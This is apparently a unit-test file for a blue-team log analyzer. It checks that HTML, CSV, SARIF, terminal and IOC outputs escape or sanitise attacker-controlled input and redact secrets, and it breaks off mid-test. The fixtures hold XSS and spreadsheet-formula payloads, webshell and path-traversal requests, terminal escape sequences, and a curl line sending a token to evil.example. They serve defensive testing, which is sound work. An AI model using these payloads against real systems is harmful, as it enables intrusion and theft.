from _support import *

class OutputRegressionTests(unittest.TestCase):
    def test_html_report_escapes_attacker_controlled_content_and_stays_offline(self):
        content = (
            "1.1.1.1 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /search.php?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1\" "
            "200 10 \"-\" \"Mozilla/5.0\"\n"
        )
        result = parse_web_access(content, "access.log")
        summary = run_detection(result.events)

        with tempfile.TemporaryDirectory() as tmp:
            report_path = Path(tmp) / "report.html"
            generate_html_report([result], summary, str(report_path))
            html = report_path.read_text(encoding="utf-8")

        self.assertNotIn("<script>alert(1)</script>", html)
        self.assertIn("&lt;script&gt;alert(1)&lt;/script&gt;", html)
        self.assertNotIn("cdn.jsdelivr", html)
        self.assertNotIn("new Chart", html)

    def test_html_report_escapes_windows_logon_summary_fields(self):
        xml = (
            "<Event><System><EventID>4625</EventID>"
            "<TimeCreated SystemTime=\"2024-03-15T01:02:03.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">&lt;img src=x onerror=alert(1)&gt;</Data>"
            "<Data Name=\"TargetDomainName\">ACME</Data>"
            "<Data Name=\"IpAddress\">1.2.3.4</Data>"
            "<Data Name=\"LogonType\">3</Data>"
            "<Data Name=\"FailureReason\">bad</Data></EventData></Event>"
        )
        result = parse_windows_xml(xml, "security.xml")
        summary = run_detection(result.events)

        with tempfile.TemporaryDirectory() as tmp:
            report_path = Path(tmp) / "report.html"
            generate_html_report([result], summary, str(report_path))
            html = report_path.read_text(encoding="utf-8")

        self.assertNotIn("<img src=x onerror=alert(1)>", html)
        self.assertIn("&lt;img src=x onerror=alert(1)&gt;", html)

    def test_html_report_stat_cards_jump_to_timeline_filters(self):
        """HTML 统计卡片应作为可点击入口，跳到对应级别事件时间线。"""
        event = LogEvent(
            id="evt-critical",
            timestamp="2024-03-15T10:00:00",
            level=ThreatLevel.CRITICAL,
            category="测试",
            source="fixture",
            source_file="events.log",
            message="critical timeline event",
            raw_line="critical timeline event",
        )
        result = ParseResult(
            "events.log", "Fixture", [event],
            ParseStats(total=1, critical=1),
        )
        summary = AnalysisSummary(
            risk_score=80,
            risk_level=ThreatLevel.CRITICAL,
            alerts=[],
            timeline=[
                TimelineEntry(
                    event_id=event.id,
                    timestamp=event.timestamp,
                    level=event.level,
                    category=event.category,
                    message=event.message,
                    source_file=event.source_file,
                )
            ],
            attack_chain=[],
            recommendations=[],
            total_events=1,
            files_analyzed=1,
        )

        with tempfile.TemporaryDirectory() as tmp:
            report_path = Path(tmp) / "report.html"
            generate_html_report([result], summary, str(report_path))
            html = report_path.read_text(encoding="utf-8")

        self.assertIn('class="stat-card stat-link"', html)
        self.assertIn('data-level="critical"', html)
        self.assertIn("jumpToEvents('critical')", html)
        self.assertIn('id="timelineSection"', html)
        self.assertIn('class="tl-entry" data-level="critical"', html)
        self.assertIn("function setTimelineFilter", html)
        self.assertIn("function filterTimeline", html)
        self.assertIn('class="brand-logo"', html)
        self.assertIn("data:image/png;base64,", html)
        self.assertNotIn("bla/output/assets/bla-logo.png", html)

    def test_terminal_report_renders_edr_tree_and_multiline_timeline(self):
        content = "\n".join([
            "\t".join([
                "事件类型", "事件子类型", "时间", "进程用户名", "进程名",
                "进程映像路径", "进程文件签名", "进程事件文件路径",
                "目标进程文件签名", "文件类型", "文件大小", "进程命令",
            ]),
            "\t".join([
                "进程事件", "进程创建", "2026-01-21 12:27:00", "Administrator",
                "Explorer.EXE", r"C:\windows\Explorer.EXE", "Microsoft Windows",
                r"C:\Program Files\7-Zip\7zG.exe", "", "exe", "553984",
                r'"C:\Program Files\7-Zip\7zG.exe" x -o"C:\Users\Administrator\Downloads\TencentttMeeti5681\" -spe',
            ]),
            "\t".join([
                "进程事件", "进程创建", "2026-01-21 12:27:59", "Administrator",
                "Explorer.EXE", r"C:\windows\Explorer.EXE", "Microsoft Windows",
                r"C:\Users\Administrator\Downloads\TencentttMeeti5681\TencentttMeeti5681.exe",
                "", "exe", "299556187",
                r'"C:\Users\Administrator\Downloads\TencentttMeeti5681\TencentttMeeti5681.exe"',
            ]),
            "\t".join([
                "进程事件", "进程创建", "2026-01-21 12:27:59", "Administrator",
                "TencentttMeeti5681.exe",
                r"C:\Users\Administrator\Downloads\TencentttMeeti5681\TencentttMeeti5681.exe",
                "", r"C:\Users\Administrator\Downloads\TencentttMeeti5681\II-10.exe",
                "", "exe", "24420072",
                r'"C:\Users\Administrator\Downloads\TencentttMeeti5681\II-10.exe"',
            ]),
            "\t".join([
                "进程事件", "进程创建", "2026-01-21 12:27:59", "Administrator",
                "II-10.exe",
                r"C:\Users\Administrator\Downloads\TencentttMeeti5681\II-10.exe",
                "", r"C:\Users\ADMINI~1\AppData\Local\Temp\is-TED13.tmp\II-10.tmp",
                "", "tmp", "0",
                r'"C:\Users\ADMINI~1\AppData\Local\Temp\is-TED13.tmp\II-10.tmp"',
            ]),
            "\t".join([
                "进程事件", "进程创建", "2026-01-21 12:27:59", "Administrator",
                "II-10.tmp",
                r"C:\Users\ADMINI~1\AppData\Local\Temp\is-TED13.tmp\II-10.tmp",
                "", r"C:\inetpub\wwwroot\rMmZhp\ewWB4p\g36Q6KT.exe",
                "", "exe", "5593032",
                r'"C:\inetpub\wwwroot\rMmZhp\ewWB4p\g36Q6KT"',
            ]),
        ])
        result = parse_content(content, "edr-export.tsv", parser_name="edr-xlsx")
        summary = run_detection(result.events)

        buf = io.StringIO()
        with mock.patch("sys.stdout", buf):
            print_terminal_report([result], summary, no_color=True, max_alerts=10)
        terminal = buf.getvalue()
        tree = terminal.split("EDR 进程链:", 1)[1].split("建议补采:", 1)[0]

        self.assertIn("EDR 进程链:", terminal)
        self.assertIn("Explorer.EXE", terminal)
        self.assertIn("└─ TencentttMeeti5681.exe", terminal)
        self.assertIn("II-10.tmp", terminal)
        self.assertIn("C:\\inetpub\\wwwroot\\rMmZhp\\ewWB4p\\g36Q6KT.exe", terminal)
        self.assertNotIn(r"C:\Users\Administrator\Downloads\TencentttMeeti5681\TencentttMeeti5681.exe", tree)
        self.assertNotIn(r"C:\Users\Administrator\Downloads\TencentttMeeti5681\II-10.exe", tree)
        self.assertIn("路径:", terminal)
        self.assertIn("命令:", terminal)

    def test_html_report_renders_geo_map_from_local_geoip_cache(self):
        """HTML 地图只使用本地 GeoIP 缓存，并按国家/地区聚合公网源 IP。"""
        events = [
            LogEvent(
                id="geo-1", timestamp="2024-03-15T10:00:00",
                level=ThreatLevel.HIGH, category="认证", source="linux-auth",
                source_file="auth.log", message="failed login from 8.8.8.8",
                raw_line="", ip="8.8.8.8",
                details={"source_type": "linux-auth", "src_ip": "8.8.8.8"},
            ),
            LogEvent(
                id="geo-2", timestamp="2024-03-15T10:00:01",
                level=ThreatLevel.MEDIUM, category="Web", source="web-access",
                source_file="access.log", message="GET / from 1.1.1.1",
                raw_line="", ip="1.1.1.1",
                details={"source_type": "web-access", "src_ip": "1.1.1.1"},
            ),
            LogEvent(
                id="geo-3", timestamp="2024-03-15T10:00:02",
                level=ThreatLevel.MEDIUM, category="Web", source="web-access",
                source_file="access.log", message="GET /admin from 9.9.9.9",
                raw_line="", ip="9.9.9.9",
                details={"source_type": "web-access", "src_ip": "9.9.9.9"},
            ),
            LogEvent(
                id="geo-4", timestamp="2024-03-15T10:00:03",
                level=ThreatLevel.INFO, category="测试", source="fixture",
                source_file="events.log", message="internal event",
                raw_line="", ip="10.0.0.5",
                details={"source_type": "fixture", "src_ip": "10.0.0.5"},
            ),
        ]
        result = ParseResult("mixed.log", "Fixture", events, ParseStats(total=4, high=1, medium=2, info=1))
        summary = AnalysisSummary(
            risk_score=40,
            risk_level=ThreatLevel.MEDIUM,
            alerts=[],
            timeline=[],
            attack_chain=[],
            recommendations=[],
            total_events=2,
            files_analyzed=1,
        )

        with tempfile.TemporaryDirectory() as tmp:
            cache_path = Path(tmp) / "geo-cache.json"
            cache_path.write_text(_json.dumps({
                "8.8.8.8": {"status": "success", "country": "United States", "regionName": "California", "city": "Mountain View"},
                "1.1.1.1": {"status": "success", "country": "Australia", "regionName": "Queensland", "city": "South Brisbane"},
            }), encoding="utf-8")
            report_path = Path(tmp) / "report.html"
            generate_html_report([result], summary, str(report_path), geoip_cache_path=str(cache_path))
            html = report_path.read_text(encoding="utf-8")

        self.assertIn("攻击源地理分布", html)
        self.assertIn("离线热力图", html)
        self.assertIn("Top 国家/地区", html)
        self.assertIn("United States", html)
        self.assertIn("Australia", html)
        self.assertIn("8.8.8.8", html)
        self.assertIn("1.1.1.1", html)
        self.assertIn("已排除 1 个内网/回环/保留源 IP", html)
        self.assertIn("1 个公网源 IP 缺少地理数据", html)
        self.assertNotIn("边界 SVG", html)
        self.assertNotIn("正式版", html)

    def test_html_report_hides_geo_map_without_located_public_ip(self):
        """没有可定位公网源 IP 时，HTML 不展示地图区块。"""
        event = LogEvent(
            id="geo-empty", timestamp="2024-03-15T10:00:00",
            level=ThreatLevel.INFO, category="测试", source="fixture",
            source_file="events.log", message="internal event",
            raw_line="", ip="10.0.0.10",
            details={"source_type": "fixture", "src_ip": "10.0.0.10"},
        )
        result = ParseResult("events.log", "Fixture", [event], ParseStats(total=1, info=1))
        summary = AnalysisSummary(
            risk_score=0,
            risk_level=ThreatLevel.INFO,
            alerts=[],
            timeline=[],
            attack_chain=[],
            recommendations=[],
            total_events=1,
            files_analyzed=1,
        )

        with tempfile.TemporaryDirectory() as tmp:
            report_path = Path(tmp) / "report.html"
            generate_html_report([result], summary, str(report_path))
            html = report_path.read_text(encoding="utf-8")

        self.assertNotIn("攻击源地理分布", html)
        self.assertNotIn("geo-map", html)

    def test_html_report_ignores_broken_geoip_cache_when_event_has_geo_fields(self):
        """GeoIP 缓存损坏时，报告仍可使用日志内地理字段生成地图。"""
        event = LogEvent(
            id="geo-event-field", timestamp="2024-03-15T10:00:00",
            level=ThreatLevel.HIGH, category="认证", source="linux-auth",
            source_file="auth.log", message="failed login from 8.8.8.8",
            raw_line="", ip="8.8.8.8",
            details={
                "source_type": "linux-auth",
                "src_ip": "8.8.8.8",
                "country": "United States",
                "regionName": "California",
            },
        )
        result = ParseResult("auth.log", "Fixture", [event], ParseStats(total=1, high=1))
        summary = AnalysisSummary(
            risk_score=40,
            risk_level=ThreatLevel.MEDIUM,
            alerts=[],
            timeline=[],
            attack_chain=[],
            recommendations=[],
            total_events=1,
            files_analyzed=1,
        )

        with tempfile.TemporaryDirectory() as tmp:
            cache_path = Path(tmp) / "broken-geo-cache.json"
            cache_path.write_text("{broken-json", encoding="utf-8")
            report_path = Path(tmp) / "report.html"
            generate_html_report([result], summary, str(report_path), geoip_cache_path=str(cache_path))
            html = report_path.read_text(encoding="utf-8")

        self.assertIn("攻击源地理分布", html)
        self.assertIn("United States", html)
        self.assertIn("8.8.8.8", html)

    def test_csv_report_neutralizes_spreadsheet_formulas(self):
        event = LogEvent(
            id="evt-1",
            timestamp="2024-03-15T10:00:00",
            level=ThreatLevel.HIGH,
            category="测试",
            source="fixture",
            source_file="events.log",
            message="=HYPERLINK(\"http://evil.test\")",
            raw_line="-2+3",
            user="+cmd",
            host="@host",
            process="\t=calc",
            details={"command": " @SUM(1+1)", "url": "https://example.test/path"},
        )
        result = ParseResult("events.log", "Fixture", [event], ParseStats(total=1))
        summary = AnalysisSummary(
            risk_score=0,
            risk_level=ThreatLevel.INFO,
            alerts=[],
            timeline=[],
            attack_chain=[],
            recommendations=[],
            total_events=1,
            files_analyzed=1,
        )

        with tempfile.TemporaryDirectory() as tmp:
            csv_path = Path(tmp) / "events.csv"
            generate_csv_report([result], summary, str(csv_path))
            with open(csv_path, newline="", encoding="utf-8-sig") as f:
                row = next(csv.DictReader(f))

        self.assertEqual(row["message"], "'=HYPERLINK(\"http://evil.test\")")
        self.assertEqual(row["user"], "'+cmd")
        self.assertEqual(row["host"], "'@host")
        self.assertEqual(row["process"], "'\t=calc")
        self.assertEqual(row["command"], "' @SUM(1+1)")
        self.assertEqual(row["raw_line"], "'-2+3")
        self.assertEqual(row["raw_line_truncated"], "false")
        self.assertEqual(row["raw_line_length"], "4")
        self.assertEqual(row["url"], "https://example.test/path")

    def test_csv_report_marks_raw_line_truncation_and_redacts_obvious_secrets(self):
        event = LogEvent(
            id="evt-long",
            timestamp="2024-03-15T10:00:00",
            level=ThreatLevel.INFO,
            category="测试",
            source="fixture",
            source_file="events.log",
            message="ok",
            raw_line="token=super-secret " + "x" * 260,
            details={"url": "/api?access_token=abc123456789"},
        )
        result = ParseResult("events.log", "Fixture", [event], ParseStats(total=1))
        summary = AnalysisSummary(
            risk_score=0,
            risk_level=ThreatLevel.INFO,
            alerts=[],
            timeline=[],
            attack_chain=[],
            recommendations=[],
            total_events=1,
            files_analyzed=1,
        )

        with tempfile.TemporaryDirectory() as tmp:
            csv_path = Path(tmp) / "events.csv"
            generate_csv_report([result], summary, str(csv_path))
            with open(csv_path, newline="", encoding="utf-8-sig") as f:
                row = next(csv.DictReader(f))

        self.assertEqual(row["raw_line_truncated"], "true")
        self.assertEqual(row["raw_line_length"], str(len("token=<redacted> " + "x" * 260)))
        self.assertIn("token=<redacted>", row["raw_line"])
        self.assertNotIn("super-secret", row["raw_line"])
        self.assertEqual(row["url"], "/api?access_token=<redacted>")

    def test_ioc_extraction_and_text_export(self):
        content = (
            "3.3.3.3 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /upload/shell.jsp?cmd=whoami HTTP/1.1\" 200 10 "
            "\"http://evil.example/a\" \"Behinder\"\n"
        )
        result = parse_web_access(content, "access.log")

        iocs = extract_iocs(result.events)
        report = format_ioc_report(iocs)

        self.assertIn("3.3.3.3", iocs["ips"])
        self.assertIn("evil.example", iocs["domains"])
        self.assertIn("/upload/shell.jsp", iocs["file_paths"])
        self.assertIn("## IP", report)

    def test_ioc_text_export_strips_controls_and_redacts_secrets(self):
        iocs = {key: [] for key in ("ips", "domains", "urls", "file_paths", "hashes", "users", "processes", "commands")}
        iocs["commands"] = [
            "\x1b]52;c;SGFja2Vk\x07curl http://evil.example/a?access_token=super-secret",
            "Authorization: Bearer abcdefghijklmnop",
        ]

        report = format_ioc_report(iocs)

        self.assertNotIn("\x1b", report)
        self.assertNotIn("SGFja2Vk", report)
        self.assertNotIn("super-secret", report)
        self.assertNotIn("abcdefghijklmnop", report)
        self.assertIn("access_token=<redacted>", report)
        self.assertIn("Authorization=<redacted>", report)

    def test_extract_iocs_returns_sanitized_values(self):
        event = LogEvent(
            id="ioc-structured",
            timestamp="2024-03-15T10:00:00",
            level=ThreatLevel.HIGH,
            category="测试",
            source="fixture",
            source_file="access.log",
            message=f"{BAD_TERMINAL_SEGMENT} curl http://evil.example/a?access_token=super-secret",
            raw_line=f"{BAD_TERMINAL_SEGMENT} curl http://evil.example/a?access_token=super-secret",
            user=BAD_TERMINAL_SEGMENT,
            process=f"powershell {BAD_TERMINAL_SEGMENT}",
            details={"command": "curl http://evil.example/a?access_token=super-secret"},
            tags=["rce"],
        )

        iocs = extract_iocs([event])
        combined = _json.dumps(iocs, ensure_ascii=False)

        self.assertNotIn("\x1b", combined)
        self.assertNotIn("\x07", combined)
        self.assertNotIn("SGVsbG8", combined)
        self.assertNotIn("super-secret", combined)
        self.assertIn("access_token=<redacted>", combined)
        self.assertIn("token=<redacted>", combined)
        self.assertIn("evil.example", iocs["domains"])

    def test_terminal_report_can_cap_large_alert_lists(self):
        content = "".join(
            "%d.0.0.1 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /wp-login.php HTTP/1.1\" 404 10 \"-\" \"Mozilla/5.0\"\n" % i
            for i in range(1, 12)
        )
        result = parse_web_access(content, "access.log")
        summary = run_detection(result.events)

        buf = io.StringIO()
        old_stdout = sys.stdout
        try:
            sys.stdout = buf
            print_terminal_report([result], summary, no_color=True, max_alerts=1)
        finally:
            sys.stdout = old_stdout

        self.assertIn("终端仅展示前 1 个告警", buf.getvalue())

    def test_terminal_report_strips_attacker_controlled_sequences(self):
        marker = "\x1b]52;c;SGFja2Vk\x07\x1b[31m"
        event = LogEvent(
            id="evt-term-1",
            timestamp="2024-03-15T10:00:00",
            level=ThreatLevel.HIGH,
            category="Web攻击",
            source="fixture",
            source_file="access.log",
            message=f"{marker}password=hunter2",
            raw_line=f"raw {marker}",
            ip="198.51.100.20",
            details={
                "method": "GET",
                "decoded_path": f"/shell.jsp?x={marker}",
                "user_agent": f"ua {marker}",
                "referer": f"ref {marker}",
            },
            tags=["web-attack"],
            mitre_attack="T1190",
            rule_name="测试",
        )
        alert = DetectionAlert(
            id="alert-term-1",
            rule_id="WEB-TERM",
            rule_name=f"{marker}Web 控制序列",
            description=f"desc {marker}",
            level=ThreatLevel.HIGH,
            category="Web攻击",
            mitre_attack="T1190",
            mitre_phase="初始访问",
            affected_events=[event.id],
            evidence=[f"evidence {marker} access_token=super-secret"],
            recommendation=f"rec {marker}",
            timestamp=event.timestamp,
            confidence="high",
        )
        result = ParseResult("access.log", "Fixture", [event], ParseStats(total=1, high=1))
        summary = AnalysisSummary(
            risk_score=80,
            risk_level=ThreatLevel.HIGH,
            alerts=[alert],
            timeline=[],
            attack_chain=[],
            recommendations=[f"action {marker}"],
            total_events=1,
            files_analyzed=1,
        )

        buf = io.StringIO()
        old_stdout = sys.stdout
        try:
            sys.stdout = buf
            print_terminal_report([result], summary, no_color=True, full_evidence=True, verbose=True)
        finally:
            sys.stdout = old_stdout

        text = buf.getvalue()
        self.assertNotIn("\x1b]52", text)
        self.assertNotIn("\x1b[31m", text)
        self.assertNotIn("\x07", text)
        self.assertNotIn("hunter2", text)
        self.assertNotIn("super-secret", text)
        self.assertIn("access_token=<redacted>", text)

    def test_terminal_truncation_uses_display_width_for_cjk_text(self):
        from bla.output.terminal import _display_width, _truncate_text

        text = "攻击路径=/var/www/html/uploads/一句很长的中文证据说明"
        truncated = _truncate_text(text, 24)

        self.assertLessEqual(_display_width(truncated), 24)
        self.assertTrue(truncated.endswith("…"))
        self.assertNotIn("\n", truncated)

    def test_terminal_report_filters_placeholder_top_ip_and_shows_utc8(self):
        result = ParseResult(
            "security.xml",
            "Fixture",
            [],
            ParseStats(
                total=2,
                top_ips=[{"ip": "192.168.126.1", "count": 6}],
                top_local_ips=[{"ip": "-", "count": 233}],
                time_start="2024-02-26T15:01:13+00:00",
                time_end="2024-02-26T15:02:24+00:00",
            ),
        )
        summary = AnalysisSummary(
            risk_score=0,
            risk_level=ThreatLevel.INFO,
            alerts=[],
            timeline=[],
            attack_chain=[],
            recommendations=[],
            total_events=0,
            files_analyzed=1,
        )

        buf = io.StringIO()
        old_stdout = sys.stdout
        try:
            sys.stdout = buf
            print_terminal_report([result], summary, no_color=True)
        finally:
            sys.stdout = old_stdout
        text = buf.getvalue()
        self.assertIn("2024-02-26 23:01:13 UTC+8", text)
        self.assertIn("UTC: 2024-02-26T15:01:13Z", text)
        self.assertIn("有效远程源 IP", text)
        self.assertIn("192.168.126.1", text)
        self.assertIn("本机/空来源", text)

    def test_iocs_filter_to_alert_related_events_only(self):
        """正常业务流量不应该污染 IOC 列表，只有告警涉及的事件才贡献 IOC。"""
        content = (
            # 1) 正常业务流量
            "10.0.0.1 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /index.html HTTP/1.1\" 200 10 \"-\" \"Mozilla/5.0\"\n"
            # 2) Webshell 攻击（会触发 web-attack 告警）
            "9.9.9.9 - - [15/Mar/2024:10:01:00 +0800] "
            "\"POST /upload/shell.jsp?cmd=whoami HTTP/1.1\" 200 10 \"-\" \"Behinder\"\n"
        )
        result = parse_web_access(content, "access.log")
        summary = run_detection(result.events)

        iocs = extract_iocs(result.events, alerts=summary.alerts)
        self.assertIn("9.9.9.9", iocs["ips"])
        self.assertNotIn("10.0.0.1", iocs["ips"],
                         "业务流量 IP 不应该出现在告警过滤后的 IOC 中")

    def test_html_report_attack_chain_has_no_trailing_arrow(self):
        """攻击链 HTML 末尾不能多出一个孤立箭头。"""
        # 用 webshell + 显式凭据生成多阶段攻击
        web_content = (
            "9.9.9.9 - - [15/Mar/2024:10:01:00 +0800] "
            "\"POST /upload/shell.jsp?cmd=whoami HTTP/1.1\" 200 10 \"-\" \"Behinder\"\n"
        )
        result = parse_web_access(web_content, "access.log")
        summary = run_detection(result.events)
        with tempfile.TemporaryDirectory() as tmp:
            report_path = Path(tmp) / "report.html"
            generate_html_report([result], summary, str(report_path))
            html = report_path.read_text(encoding="utf-8")
        # chain-wrapper 内 15 个 phase 之间应该恰好 14 个箭头（不是 15 个）
        chain_section = html.split('class="chain-wrapper"', 1)[1].split("</div>", 50)[0:50]
        chain_block = "".join(chain_section)
        self.assertEqual(chain_block.count('class="chain-arrow"'), 14)

    def test_sarif_report_is_valid_and_maps_levels(self):
        """SARIF 输出应当包含 runs/tool/rules/results，且严重告警 → "error"。"""
        content = (
            "9.9.9.9 - - [15/Mar/2024:10:01:00 +0800] "
            "\"POST /upload/shell.jsp?cmd=whoami HTTP/1.1\" 200 10 \"-\" \"Behinder\"\n"
        )
        result = parse_web_access(content, "access.log")
        summary = run_detection(result.events)

        with tempfile.TemporaryDirectory() as tmp:
            sarif_path = Path(tmp) / "report.sarif"
            generate_sarif_report([result], summary, str(sarif_path))
            data = _json.loads(sarif_path.read_text(encoding="utf-8"))

        self.assertEqual(data["version"], "2.1.0")
        self.assertGreaterEqual(len(data["runs"]), 1)
        run = data["runs"][0]
        self.assertEqual(run["tool"]["driver"]["name"], "BlueTeam Log Analyzer")
        self.assertGreaterEqual(len(run["results"]), 1)
        # 至少一个 result level 是 "error"（CRITICAL/HIGH 都映射到 error）
        self.assertTrue(any(r["level"] == "error" for r in run["results"]))

    def test_sarif_keeps_first_matching_source_file_for_cross_file_alert(self):
        event_a = LogEvent(
            id="e-a", timestamp="2024-03-15T10:00:00", level=ThreatLevel.HIGH,
            category="测试", source="fixture", source_file="first.log",
            message="first", raw_line="first",
        )
        event_b = LogEvent(
            id="e-b", timestamp="2024-03-15T10:01:00", level=ThreatLevel.HIGH,
            category="测试", source="fixture", source_file="second.log",
            message="second", raw_line="second",
        )
        alert = DetectionAlert(
            id="a-cross", rule_id="TEST-001", rule_name="跨文件告警",
            description="cross file", level=ThreatLevel.HIGH, category="测试",
            mitre_attack="T1190", mitre_phase="初始访问",
            affected_events=["e-a", "e-b"], evidence=[],
            recommendation="", timestamp="2024-03-15T10:01:00", confidence="high",
        )
        summary = AnalysisSummary(
            risk_score=0, risk_level=ThreatLevel.INFO, alerts=[alert],
            timeline=[], attack_chain=[], recommendations=[],
            total_events=2, files_analyzed=2,
        )
        result_a = ParseResult("first.log", "Fixture", [event_a], ParseStats(total=1))
        result_b = ParseResult("second.log", "Fixture", [event_b], ParseStats(total=1))

        with tempfile.TemporaryDirectory() as tmp:
            sarif_path = Path(tmp) / "report.sarif"
            generate_sarif_report([result_a, result_b], summary, str(sarif_path))
            data = _json.loads(sarif_path.read_text(encoding="utf-8"))

        uri = data["runs"][0]["results"][0]["locations"][0]["physicalLocation"]["artifactLocation"]["uri"]
        self.assertEqual(uri, "first.log")

    def test_sarif_rejects_untrusted_mitre_help_uri(self):
        safe_alert = DetectionAlert(
            id="a-safe",
            rule_id="TEST-SAFE",
            rule_name="safe mitre",
            description="safe",
            level=ThreatLevel.HIGH,
            category="测试",
            mitre_attack="T1003.001",
            mitre_phase="凭据访问",
            affected_events=[],
            evidence=[],
            recommendation="review",
            timestamp="2024-03-15T10:00:00",
            confidence="high",
        )
        bad_mitre = f"T1059.access_token=super-secret{BAD_TERMINAL_SEGMENT}"
        bad_alert = DetectionAlert(
            id="a-bad",
            rule_id="TEST-BAD",
            rule_name="bad mitre",
            description="bad",
            level=ThreatLevel.HIGH,
            category="测试",
            mitre_attack=bad_mitre,
            mitre_phase="执行",
            affected_events=[],
            evidence=[],
            recommendation="review",
            timestamp="2024-03-15T10:01:00",
            confidence="high",
        )
        summary = AnalysisSummary(
            risk_score=0,
            risk_level=ThreatLevel.INFO,
            alerts=[safe_alert, bad_alert],
            timeline=[],
            attack_chain=[],
            recommendations=[],
            total_events=0,
            files_analyzed=0,
        )

        with tempfile.TemporaryDirectory() as tmp:
            sarif_path = Path(tmp) / "report.sarif"
            generate_sarif_report([], summary, str(sarif_path))
            text = sarif_path.read_text(encoding="utf-8")
            data = _json.loads(text)

        rules = {rule["id"]: rule for rule in data["runs"][0]["tool"]["driver"]["rules"]}
        self.assertEqual(
            rules["TEST-SAFE"]["helpUri"],
            "https://attack.mitre.org/techniques/T1003/001",
        )
        self.assertEqual(rules["TEST-BAD"]["helpUri"], "")
        self.assertNotIn("\x1b", text)
        self.assertNotIn("\x07", text)
        self.assertNotIn("SGVsbG8", text)
        self.assertNotIn("super-secret", text)
        self.assertIn("access_token=<redacted>", text)

    def test_sarif_remote_artifact_uri_sanitizes_path(self):
        source_file = f"host01:/var/log/{BAD_TERMINAL_SEGMENT}.log"
        event = LogEvent(
            id="e-remote",
            timestamp="2024-03-15T10:00:00",
            level=ThreatLevel.HIGH,
            category="测试",
            source="fixture",
            source_file=source_file,
            message="remote event",
            raw_line="remote event",
        )
        alert = DetectionAlert(
            id="a-remote",
            rule_id="TEST-REMOTE",
            rule_name="远程路径清洗",
            description="remote artifact",
            level=ThreatLevel.HIGH,
            category="测试",
            mitre_attack="T1190",
            mitre_phase="初始访问",
            affected_events=[event.id],
            evidence=[],
            recommendation="review remote artifact",
            timestamp=event.timestamp,
            confidence="high",
        )
        result = ParseResult(source_file, "Fixture", [event], ParseStats(total=1, high=1))
        summary = AnalysisSummary(
            risk_score=0,
            risk_level=ThreatLevel.INFO,
            alerts=[alert],
            timeline=[],
            attack_chain=[],
            recommendations=[],
            total_events=1,
            files_analyzed=1,
        )

        with tempfile.TemporaryDirectory() as tmp:
            sarif_path = Path(tmp) / "report.sarif"
            generate_sarif_report([result], summary, str(sarif_path))
            text = sarif_path.read_text(encoding="utf-8")
            data = _json.loads(text)

        uri = data["runs"][0]["results"][0]["locations"][0]["physicalLocation"]["artifactLocation"]["uri"]
        self.assertEqual(uri, "remote/host01/var/log/token=<redacted>")
        self.assertNotIn("\x1b]52", text)
        self.assertNotIn("\x07", text)
        self.assertNotIn("SGVsbG8", text)
        self.assertNotIn("super-secret", text)

    def test_ioc_drops_boring_paths_but_keeps_attack_paths(self):
        """IOC 路径列表只保留有意义的路径，过滤 / 和 /index.html 这类噪音。"""
        content = (
            "9.9.9.9 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /download.php?file=../../etc/passwd HTTP/1.1\" 200 10 \"-\" \"curl/8\"\n"
        )
        result = parse_web_access(content, "access.log")
        summary = run_detection(result.events)
        iocs = extract_iocs(result.events, alerts=summary.alerts)
        self.assertTrue(any("etc/passwd" in p for p in iocs["file_paths"]),
                        "命中 LFI 的关键路径必须保留")
        self.assertNotIn("/", iocs["file_paths"], "根路径不应进 IOC")
        self.assertNotIn("/index", iocs["file_paths"])

    def test_ioc_rejects_invalid_ip_and_static_asset_prefixes(self):
        event = LogEvent(
            id="ioc-invalid",
            timestamp="2024-03-15T10:00:00",
            level=ThreatLevel.HIGH,
            category="测试",
            source="fixture",
            source_file="access.log",
            message="GET /static/app.js from 999.999.999.999",
            raw_line="999.999.999.999 /static/app.js",
            ip="999.999.999.999",
        )

        iocs = extract_iocs([event])

        self.assertNotIn("999.999.999.999", iocs["ips"])
        self.assertNotIn("/static/app.js", iocs["file_paths"])

    def test_ioc_filters_default_domain_blocklist(self):
        """example.com / localhost 不应进入 IOC 域名列表。"""
        content = (
            "9.9.9.9 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /shell.php?cmd=whoami HTTP/1.1\" 200 10 "
            "\"http://localhost/test\" \"curl http://example.com\"\n"
        )
        result = parse_web_access(content, "access.log")
        summary = run_detection(result.events)
        iocs = extract_iocs(result.events, alerts=summary.alerts)
        self.assertNotIn("example.com", iocs["domains"])
        self.assertNotIn("localhost", iocs["domains"])

    def test_report_bundle_generates_standard_outputs(self):
        """--out 背后的 bundle 输出应生成完整交付目录。"""
        content = (
            "9.9.9.9 - - [15/Mar/2024:10:01:00 +0800] "
            "\"POST /upload/shell.jsp?cmd=whoami HTTP/1.1\" 200 10 \"-\" \"Behinder\"\n"
        )
        result = parse_web_access(content, "access.log")
        summary = run_detection(result.events)
        with tempfile.TemporaryDirectory() as tmp:
            out_dir = Path(tmp) / "report"
            paths = generate_report_bundle([result], summary, str(out_dir))
            for key in ("html", "json", "csv", "ioc", "sarif", "brief", "evidence", "manifest"):
                self.assertTrue(Path(paths[key]).exists(), key)
            manifest = _json.loads(Path(paths["manifest"]).read_text(encoding="utf-8"))
            self.assertEqual(Path(paths["html"]).name, "index.html")
            self.assertEqual(manifest["schema"], "bla-report-manifest-v1")
            self.assertEqual(len(manifest["outputs"]), 7)
            self.assertEqual(manifest["summary"]["alert_count"], len(summary.alerts))
            self.assertTrue(manifest["summary"]["incident_brief"])
            self.assertIn("疑似 Webshell", Path(paths["brief"]).read_text(encoding="utf-8"))
            evidence_header = Path(paths["evidence"]).read_text(encoding="utf-8").splitlines()[0]
            self.assertIn("used_by", evidence_header)

    def test_run_analysis_bundle_manifest_hashes_local_inputs_without_absolute_paths(self):
        content = (
            "9.9.9.9 - - [15/Mar/2024:10:01:00 +0800] "
            "\"GET /download.php?file=../../etc/passwd HTTP/1.1\" 200 10 \"-\" \"curl/8\"\n"
        )
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            input_path = root / "access.log"
            out_dir = root / "report"
            input_path.write_text(content, encoding="utf-8")
            expected_hash = __import__("hashlib").sha256(input_path.read_bytes()).hexdigest()
            expected_size = input_path.stat().st_size

            run_analysis(
                AnalysisOptions(
